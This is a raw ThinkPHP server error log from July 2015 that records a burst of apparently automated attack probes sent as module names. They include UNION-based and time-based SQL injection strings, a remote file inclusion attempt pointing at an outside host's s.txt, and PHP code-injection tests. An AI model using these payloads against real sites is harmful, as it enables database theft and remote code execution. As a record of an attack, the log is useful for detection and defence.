[ 2015-07-30T22:23:37+08:00 ] ERR: (ThinkException) 无法加载模块Index][(([)',""
[ 2015-07-30T22:23:38+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-07-30T22:23:39+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-07-30T22:23:39+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-07-30T22:23:40+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-07-30T22:23:40+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-07-30T22:23:40+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-07-30T22:23:41+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-07-30T22:23:41+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-07-30T22:23:42+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-07-30T22:23:42+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-07-30T22:23:43+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-07-30T22:23:43+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-07-30T22:23:43+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-07-30T22:23:44+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-07-30T22:23:44+08:00 ] ERR: (ThinkException) 无法加载模块Index' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-07-30T22:23:45+08:00 ] ERR: (ThinkException) 无法加载模块Index AND SLEEP(5)
[ 2015-07-30T22:23:45+08:00 ] ERR: (ThinkException) 无法加载模块Index; SELECT PG_SLEEP(5)--
[ 2015-07-30T22:23:46+08:00 ] ERR: (ThinkException) 无法加载模块Index; SELECT SLEEP(5)-- 
[ 2015-07-30T22:23:46+08:00 ] ERR: (ThinkException) 无法加载模块Index'; SELECT SLEEP(5)-- 
[ 2015-07-30T22:23:47+08:00 ] ERR: (ThinkException) 无法加载模块Index WAITFOR DELAY '0:0:5'--
[ 2015-07-30T22:26:36+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-07-30T22:26:39+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-07-30T22:26:42+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-07-30T22:27:02+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-07-30T22:27:06+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-07-30T22:27:10+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
